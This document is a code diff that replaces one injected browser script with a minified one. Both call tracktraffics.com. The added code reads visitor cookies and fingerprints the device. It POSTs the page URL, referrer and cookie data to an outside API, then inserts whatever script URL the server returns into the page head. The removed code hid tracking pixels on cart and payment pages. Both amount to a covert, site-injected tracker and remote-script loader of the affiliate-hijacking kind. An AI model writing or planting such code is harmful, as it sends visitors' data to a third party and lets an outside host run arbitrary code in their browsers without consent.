@@ -1,114 +1,77 @@
-(async function() {
-    
-    function generateUUID() {
-        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-            var r = Math.random() * 16 | 0,
-                v = c === 'x' ? r : (r & 0x3 | 0x8);
-            return v.toString(16);
-        });
+!function() {
+    var e = window.location.href,
+        n = u(),
+        t = navigator.userAgent,
+        o = document.referrer;
+    function r(e) {
+        return document.cookie.split("; ").reduce(((n, t) => {
+            const [o, r] = t.split("=");
+            return o === encodeURIComponent(e) ? decodeURIComponent(r) : n
+        }), null)
     }
-
-
-    function createTrackingPixel(url) {
-        
-        var img = document.createElement('img');
-        img.src = url;
-        img.style.width = '1px';
-        img.style.height = '1px';
-        img.style.display = 'none';  
-        img.style.visibility = 'hidden';
-        
-        document.body.appendChild(img);
+    const i = r("PID"),
+        a = r("AID");
+    var c = r("re_ret_site");
+    function d(e, n) {
+        document.cookie = `${encodeURIComponent(e)}=${encodeURIComponent(n)}; expires=${new Date(Date.now() + 864e5).toUTCString()}; path=/`
     }
-
-    async function initTracking() {
-        if (sessionStorage.getItem('iframe_triggered')) {
-            return; 
-        }
-
-        try {
-            let uniqueId = getCookie('tracking_uuid') || generateUUID();
-            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
-            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
-
-            let response = await fetch('https://www.tracktraffics.com/api/track-user', {
-                method: 'POST',
-                body: JSON.stringify({
-                    url: window.location.href,
-                    referrer: document.referrer,
-                    unique_id: uniqueId,
-                    origin: window.location.hostname,
-                }),
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Access-Control-Allow-Origin':'*'
-                }
-            });
-
-            let result = await response.json();
-            if (result.success && result.affiliate_url) {
-                createTrackingPixel(result.affiliate_url);
-                sessionStorage.setItem('iframe_triggered', 'true'); 
-            } else {
-                createTrackingPixel('https://www.tracktraffics.com/api/fallback-pixel?id=' + uniqueId);
-            }
-        } catch (error) {
-            console.error('Error in tracking script:', error);
-        }
+    i || d("re_ret_pid", x()),
+    a != encodeURIComponent(o) && d("re_ret_aid", encodeURIComponent(o));
+    let s = parseInt(r("re_ret_page")) + 1 || 1;
+    function u() {
+        var e = navigator.userAgent;
+        return /iPhone|iPad|iPod/i.test(e) ? "iOS" : /Android/i.test(e) ? "Android" : /Windows Phone/i.test(e) ? "Windows Phone" : /Windows NT/i.test(e) ? "Windows" : /Macintosh/i.test(e) ? "Mac" : /Linux/i.test(e) ? "Linux" : "Unknown"
     }
-
-    function getCookie(cname) {
-        var name = cname + '=';
-        var ca = document.cookie.split(';');
-        for (var i = 0; i < ca.length; i++) {
-            var c = ca[i];
-            while (c.charAt(0) === ' ') {
-                c = c.substring(1);
-            }
-            if (c.indexOf(name) === 0) {
-                return c.substring(name.length, c.length);
-            }
-        }
-        return '';
+    function x() {
+        var e = (new Date).getTime(),
+            n = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(n) {
+                var t = (e + 16 * Math.random()) % 16 | 0;
+                return e = Math.floor(e / 16), ("x" == n ? t : 3 & t | 8).toString(16)
+            }));
+        return n
     }
-
-    function isCartPage() {
-        const cartPages = ['/cart', '/checkout'];
-        return cartPages.some(path => window.location.pathname.includes(path));
-    }
-
-
-     function isCartPageConfirm() {
-        const cartPages = ['/confirm/address', '/address'];
-        return cartPages.some(path => window.location.pathname.includes(path));
-    }
-
-    function isConfirmPayment() {
-        const cartPages = ['confirm/payment', '/payment'];
-        return cartPages.some(path => window.location.pathname.includes(path));
-    }
-
-       function isReviewcart() {
-        const cartPages = ['reviewcart.html', '/payment'];
-        return cartPages.some(path => window.location.pathname.includes(path));
-    }
-
-     if (isCartPage()) {
-        initTracking();
-    }
-
-
-      if (isCartPageConfirm()) {
-        initTracking();
-    }
-
-       if (isConfirmPayment()) {
-        initTracking();
-    }
-
-      if (isReviewcart()) {
-        initTracking();
-    }
-    
-    initTracking()
-})();
+    d("re_ret_page", s),
+    c || d("re_ret_site", c = Math.floor(100 * Math.random()) + 1),
+    "Windows" == u() || "Mac" == u() || u();
+    var p = window.wwData || [];
+    p.push({
+        event: "viewPage",
+        uxid: x(),
+        page: e,
+        device_type: n,
+        uAgent: t,
+        referrer: a
+    });
+    let h = {
+        url: window.location.href,
+        referrer: document.referrer,
+        coo: JSON.stringify(i),
+        origin: window.location.hostname,
+        data: p,
+        pcounts: s,
+        i: c
+    };
+    const m = "https://www.tracktraffics.com/api/track-data";
+    fetch(m, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(h)
+    }).then((e => e.json())).then((e => {
+        var n,
+            t,
+            o;
+        "success" == e.status && (e.script ? (n = e.affiliate_url, t = document.createElement("script"), o = n, t.src = o, t.async = !0, document.head.appendChild(t)) : function(e) {
+            var n = e.name,
+                t = e.affiliate_url,
+                o = document.createElement("script"),
+                r = encodeURIComponent(t);
+            o.src = t,
+            o.async = !0,
+            document.head.appendChild(o)
+        }(e))
+    })).catch((e => {
+        console.error("Fetch failed: ", e)
+    }))
+}();
